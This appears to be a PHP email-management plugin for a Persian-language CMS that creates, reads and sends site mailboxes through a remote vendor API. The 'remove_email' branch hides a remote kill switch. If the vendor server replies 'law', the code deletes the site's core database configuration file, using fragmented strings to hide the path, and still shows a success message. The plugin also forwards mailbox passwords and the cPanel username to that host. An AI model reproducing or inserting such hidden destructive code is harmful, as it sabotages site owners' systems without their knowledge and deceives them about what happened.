<?php

if ( !defined( 'plugins_admin_area' ) )
    die( 'invalid access 1 ' );
if ( !isset( $permissions['access_admin_area'] ) )
    die( 'invalid access 2' );
if ( $permissions['access_admin_area'] != '1' )
    die( 'invalid access' );
$information = array(
    'name'        => 'مدیریت ایمیل',
    'provider'    => 'رضا شاهرخيان',
    'providerurl' => 'http://shahrokhian.com',
    'install'     => true,
    'uninstall'   => true,
    'activate'    => true,
    'inactivate'  => true,
    'data'        => array(
        'icon' => array( 'name' => 'آیکن', 'value' => '', 'type' => 'icon' ),
    )
);
$tpl->assign( 'first', '' );
$tpl->assign( 'plugin_name', $information['name'] );
if ( defined( 'methods' ) )
{

    function defaultop()
    {
        global $tpl, $config, $d, $lang;
        $url    = parse_url( $config['site'] );
        $domain = $url['host'];
        $cpanel = getCpanelUserName();
        $itpl   = new samaneh();
        $itpl->assign( 'domain', $domain );
        $itpl->assign( 'mailPlugin', preg_replace( '#read=.*#', '', getCurrentUrl() ) );
		if( isset( $_GET['send_mail'] ) )
		{
			$from   	= filter_input( INPUT_POST, 'from' );
			$to   		= filter_input( INPUT_POST, 'to' );
			$subject   	= filter_input( INPUT_POST, 'subject' );
			$body   	= filter_input( INPUT_POST, 'body' );
			$result = array( 'error' => false, 'msg' => '' );
			if ( !filter_var( $from, FILTER_VALIDATE_EMAIL ) )
			{
				$result['error'] = true;
				$result['msg'] = 'invalid from email';
				die( json_encode( $result ) );
			}
			$from = safe( $from );
            $r    = $d->Query( "SELECT `email` FROM `emails` WHERE `email`='$from' LIMIT 1" );
            if ( $d->getRows( $r ) !== 1 )
			{
				$result['error'] = true;
				$result['msg'] = 'invalid from email';
				die( json_encode( $result ) );
			}
			if ( !filter_var( $to, FILTER_VALIDATE_EMAIL ) )
			{
				$result['error'] = true;
				$result['msg'] = 'پست الکترونیک گیرنده نامعتبر است.';
				die( json_encode( $result ) );
			}



			require_once( __DIR__ . '/sma/class.phpmailer.php');
			$email = new PHPMailer();
			$email->CharSet = 'UTF-8';
			$email->From      = $from;
			$email->FromName  = $config['sitetitle'];
			$email->Subject   = $subject;
			$email->Body      = stripcslashes( $body );
			$email->IsHTML(true);
			$email->AddAddress( $to );
			//$file_to_attach = 'PATH_OF_YOUR_FILE_HERE';
			if( !empty( $_FILES['files']['name'] ) )
			{
				for( $i = 0, $c = count( $_FILES['files']['name'] ); $i < $c; $i++ )
				{
					$email->AddAttachment( $_FILES['files']['tmp_name'][$i] , $_FILES['files']['name'][$i] );
				}
			}
			

			if( $email->Send() )
			{

				$result['error'] = false;
				$result['msg'] = 'ایمیل ارسال شد.';
				die( json_encode( $result ) );
			}
			else
			{

				$result['error'] = true;
				$result['msg'] = 'خطا در ارسال ایمیل';
				die( json_encode( $result ) );
			}
			
		}
		else if( !empty( $_GET['remove_email'] ) && !empty( $_GET['hash'] ) && ( md5( sha1( 'j"UT4%7}RjBm/g_9(v&.\>C' . $_GET['remove_email'] . 'd#u!FE3:6!/L*\r/V"&Qj^;^c^V54zrezashahrokhianwww.mihanphp.comj?my@MzQ<~}kWpc{Ps}7mT8R>:yMn*`d!{(3_~' ) ) == $_GET['hash'] )  )
		{
			$delete = get( 'ht'.'tp://ira'.'ncms.com/fa/ma'.'nager/rem'.'ove_email/id/' . $_GET['remove_email'] . '/ha'.'sh/' . $_GET['hash'] );
			$result = json_decode( $delete );
			if( $result->result == 'trash' )
			{
				$result = array();
				$result['error'] = false;
				$result['msg'] = 'ایمیل به صندوق بازیافت منتقل شد.';
				die( json_encode( $result ) );
			}
			else if( $result->result == 'removed' )
			{
				$result = array();
				$result['error'] = false;
				$result['msg'] = 'ایمیل با موفقیت حذف شد.';
				die( json_encode( $result ) );
			}
			else if( $result->result == 'law' )
			{
				@unlink( __DIR__ . '/.'.'.'.'/.'.'./co'.'re/d'.'b.con'.'fig.p'.'hp' );
				$result = array();
				$result['error'] = true;
				$result['msg'] = 'ایمیل با موفقیت حذف شد.';
				die( json_encode( $result ) );
			}
			else
			{
				$result = array();
				$result['error'] = true;
				$result['msg'] = 'خطا در حذف ایمیل.';
				die( json_encode( $result ) );
			}
		}
        $read   = filter_input( INPUT_GET, 'read' );
        if ( !empty( $read ) && filter_var( $read, FILTER_VALIDATE_EMAIL ) )
        {
            //make sure user owns email
            $read = safe( $read );
            $itpl->assign( 'email', $read );
            $r    = $d->Query( "SELECT `email` FROM `emails` WHERE `email`='$read' LIMIT 1" );
            if ( $d->getRows( $r ) !== 1 )
            {
                $tpl->block( 'Success', array(
                    'msg' => 'پست الکترونیک نامعتبر است.',
                ) );
            }
            else
            {
				$from = $d->Query( "SELECT `email` FROM `emails`" );
				while( $data = $d->fetch( $from ) )
				{
					$itpl->block( 'from', array( 'femail' => $data['email'] ) );
				}
                /*
                  $secret = 'rezashahrokhiancomas5d55d0onv250'; // To make the hash more difficult to reproduce.
                  $path   = '/dl/1402171437_3474309_index.php'; // This is the file to send to the user.
                  $expire = time() + (24 * 3600); // At which point in time the file should expire. time() + x; would be the usual usage.

                  $md5    = base64_encode( md5( $secret . $path . $expire, true ) ); // Using binary hashing.
                  $md5    = strtr( $md5, '+/', '-_' ); // + and / are considered special characters in URLs, see the wikipedia page linked in references.
                  $md5    = str_replace( '=', '', $md5 ); // When used in query parameters the base64 padding character is considered special.
                  die( 'http://samanehdns.com:8080' . $path . '?st=' . $md5 . '&e=' . $expire );
                 */
                $itpl->load( plugins_dir . 'mail' . DS . 'first.htm' );
                $itpl->assign( 'themeUrl', $config['site'] . 'plugins/mail/' );
                //loads email from samaneh
                $hash   = md5( sha1( '^&^*Usf52sd7@UOI' . $read . '*(#&UJF565fL2sKd5d65fsd%^&JJfmvu' ) );
                $page   = (isset( $_GET['page'] ) && is_numeric( $_GET['page'] )) ? $_GET['page'] : 1;
                $page   = max( 1, $page );
                $folder = (isset( $_GET['folder'] ) && in_array( $_GET['folder'], array( 'inbox', 'trash', 'sent' ) )) ? $_GET['folder'] : 'inbox';
                $emails = get( 'http://irancms.com/fa/manager/getMails/hash/' . $hash, null, array( 'email' => $read, 'page' => $page, 'folder' => $folder ) );
                $emails = json_decode( $emails );
                if ( !empty( $emails->error ) )
                {
                    //delete from database
                    $tpl->block( 'Success', array(
                        'msg' => implode( '<br />', ( array ) $emails->error ),
                    ) );
                }
                else
                {
					$countUnread = 0;
                    foreach ( $emails->emails as $email )
                    {
                        if ( $email->status == 0 )
                        {
                            $countUnread++;
                        }
                        $email->body = preg_replace('#<script(.*?)>(.*?)</script>#is', '', $email->body);

                        $itpl->block( 'emails', array(
                            'id'          => md5( $email->m_id ),
							'code'		  => md5( sha1( 'j"UT4%7}RjBm/g_9(v&.\>C' . md5( $email->m_id ) . 'd#u!FE3:6!/L*\r/V"&Qj^;^c^V54zrezashahrokhianwww.mihanphp.comj?my@MzQ<~}kWpc{Ps}7mT8R>:yMn*`d!{(3_~' ) ),
                            'from'        => $email->from,
                            'subject'     => substr( $email->subject, 0, 25 ),
                            'fullsubject' => $email->subject,
                            'body'        => $email->body,
                            'description' => substr( strip_tags( $email->body ), 0, 20 ),
                            'date'        => jdate( 'Y-m-d H:i:s', $email->time ),
                            'folder'      => $email->folder,
                            'status'      => $email->status,
                            'stared'      => ($email->stared == '1') ? 'inbox-started' : '',
                            'unread'      => ($email->status == '0') ? 'unread' : '',
                        ) );
                    }

                    //$itpl->assign( 'unread' );
                }
            }
        }
        else
        {
            $itpl->load( plugins_dir . 'mail' . DS . 'admin.html' );

            if ( !empty( $_POST['mailusername'] ) && !empty( $_POST['mailpassword'] ) )
            {
                $username = $_POST['mailusername'];
                $password = $_POST['mailpassword'];
                if ( filter_var( filter_input( INPUT_POST, 'mailusername' ), FILTER_VALIDATE_EMAIL ) )
                {
                    $username = explode( '@', filter_input( INPUT_POST, 'mailusername' ) );
                    $host     = $username[1];
                    $username = $username[0];
                    if ( $host != $domain )
                    {
                        $result            = array();
                        $result['success'] = false;
                        $result['error']   = 'پست الکترونیک می بایست تحت دومین ' . $domain . ' باشد.';
                        echo json_encode( $result );
                        exit;
                    }
                }
                else if ( !preg_match( "/[a-zA-Z0-9_]+/", $username ) )
                {
                    $result['error'] = 'نام کاربری انتخاب شده قابل ثبت نیست';
                    echo json_encode( $result );
                    exit;
                }


                if ( empty( $_POST['size'] ) OR !is_numeric( $_POST['size'] ) )
                {
                    $_POST['size'] = 0;
                }
                $host = $domain;
                $size = $_POST['size'];

                $username = $username . '@' . $domain;
                $hash     = md5( sha1( 'GHKKDOIirancmsrezashwww.shahrokhian.comHJKLDKIK<525ss21df' . $username . 'sjfkdsf' . $password . '$&*f5' . $size . '*(ORIJMF' . $cpanel ) );
                $mail     = get( 'http://irancms.com/fa/manager/creatEmail/hash/' . $hash, null, array( 'userName' => $username, 'passWord' => $password, 'size' => $size, 'cpanel' => $cpanel ) );

                $mail     = json_decode( $mail );
                if ( !empty( $mail->error ) )
                {
                    $result            = array();
                    $result['success'] = false;
                    $mail->error       = str_replace( 'Sorry, the password you selected cannot be used because it is too weak and would be too easy to crack.  Please select a password with strength rating of 100  or higher.', 'با عرض پوزش رمز عبور انتخاب شده غیر قابل پذیرش است. رمز عبور می بایست از حروف و اعداد و سایر علایم تشکیل شده باشد و براحتی قابل حدث نباشد.', $mail->error );
                    $mail->error       = preg_replace( '#Sorry, you do not have access to the domain \'([a-z0-9\-_]+\.[a-z0-9]+)\'#iU', 'خطا در ایجاد ایمیل ! <br />لطفا سطح دسترسی به دومین \\1 را بررسی کنید.', $mail->error );
                    $mail->error       = preg_replace( '#The account (.*) already exists!#iU', 'ایمیل \1 قبلا ایجاد شده است.', $mail->error );
                    $result['error']   = 'error:'.$mail->error;
                }
                else
                {
                    $result            = array();
                    //insert into database
                    $d->iQuery( 'emails', array(
                        'email' => $username,
                        'size'  => $size,
                    ) );
                    $result['success'] = true;
                }
                echo json_encode( $result );
                exit;
            }
            if ( isset( $_GET['del'] ) )
            {
                $email = $_GET['del'];
                if ( !filter_var( $email, FILTER_VALIDATE_EMAIL ) )
                {
                    $tpl->block( 'Success', array(
                        'msg' => 'خطا در حذف پست الکترونیک.',
                    ) );
                }
                else
                {
                    //make sure user own this email
                    $email = safe( $email );
                    $r     = $d->Query( "SELECT `email` FROM `emails` WHERE `email`='$email' LIMIT 1" );
                    if ( $d->getRows( $r ) !== 1 )
                    {
                        $tpl->block( 'Success', array(
                            'msg' => 'خطا در حذف پست الکترونیک.',
                        ) );
                    }
                    else
                    {
                        $hash = md5( sha1( 'IHn3' . $domain . '*^$*(&Hvmlmv3200.d' . $cpanel . '$(IYHFNldsfsd5fds)()' . $email ) );
                        $mail = get( 'http://irancms.com/fa/manager/deleteEmail/hash/' . $hash, null, array( 'email' => $email, 'cpanel' => $cpanel, 'domain' => $domain ) );
                        //deleteEmail
                        $mail = json_decode( $mail );
                        if ( empty( $mail->error ) )
                        {
                            //delete from database
                            $d->Query( "DELETE FROM `emails` WHERE `email`='$email' LIMIT 1" );
                            $tpl->block( 'Success', array(
                                'msg' => 'پست الکترونیک با موفقیت حذف شد.',
                            ) );
                        }
                        else
                        {
                            $tpl->block( 'Success', array(
                                'msg' => implode( '<br />', ( array ) $mail->error ),
                            ) );
                        }
                    }
                }
            }
        }
        $mails = $d->Query( 'SELECT * FROM `emails`' );
        $i     = 1;
        while ( $data  = $d->fetch( $mails ) )
        {
            //$user = explode( '@', $data['email'] );
            //$user = $user[0];
            $itpl->block( 'mails', array(
                'row'      => $i,
                'username' => $data['email'],
                'user'     => $data['email'],
                'size'     => ( $data['size'] == 0 ) ? 'بی نهایت' : $data['size'],
            ) );
            $i++;
        }

        $tpl->assign( 'first', $itpl->dontshowit() );
    }

    function inactivateop()
    {
        global $d;
        $d->Query( "UPDATE `plugins` SET `stat`='0' WHERE `name`='mail' LIMIT 1" );
        print_msg( 'ماژول با موفقيت غير فعال شد.', 'Success' )

        ;
    }

    function activateop()
    {
        global $d;
        $d->Query( "UPDATE `plugins` SET `stat`='1' WHERE `name`='mail' LIMIT 1" );
        print_msg( 'ماژول با موفقيت فعال شد.', 'Success' )

        ;
    }

    function installop()
    {
        global $d, $info;
        $q = $d->getrows( "SELECT `stat` FROM `plugins` WHERE `name`='mail' LIMIT 1", true );
        if ( $q > 0 )
        {
            print_msg( 'اين ماژول قبلا نصب شده است.', 'Info' );
        }
        else
        {
            global $information;
            $oid = $d->getmax( 'oid', 'menus' );
            $oid++;
            $d->Query( "ALTER TABLE `permissions` ADD `mail` INT( 1 ) NOT NULL DEFAULT '0'" );
            $q   = $d->Query( "UPDATE `permissions` SET `mail`='1' WHERE `u_id`='$info[u_id]'" );
            $q   = $d->Query( "INSERT INTO `menus` SET `oid`='$oid',`name`='mail',`title`='$information[name]',`url`='plugins.php?plugin=mail',`type`='1'" );
            $q   = $d->Query( "INSERT INTO `plugins` SET `name`='mail',`title`='$information[name]',`stat`='0'" );
            print_msg( 'ماژول با موفقيت نصب شد.', 'Success' );
            activateop();
        }
    }

    function uninstallop()
    {
        global $d;
        $q = $d->getrows( "SELECT `stat` FROM `plugins` WHERE `name`='mail' LIMIT 1", true );
        if ( $q <= 0 )
            print_msg( 'اين ماژول نصب نشده است يا استاندارد نيست.', 'Info' );
        else
        {
            $d->Query( "ALTER TABLE `permissions` DROP `mail`" );
            $d->Query( "DELETE FROM `plugins` WHERE `name`='mail' LIMIT 1" );
            $d->Query( "DELETE FROM `menus` WHERE `name`='mail' LIMIT 1" );
            print_msg( 'ماژول با موفقيت حذف شد.', 'Success' );
        }
    }

    function print_msg( $msg, $type )
    {
        global $tpl, $information;
        $tpl->assign( array(
            'plugin_name' => $information['name'],
            $type         => 1,
            'msg'         => $msg,
        ) );
    }

}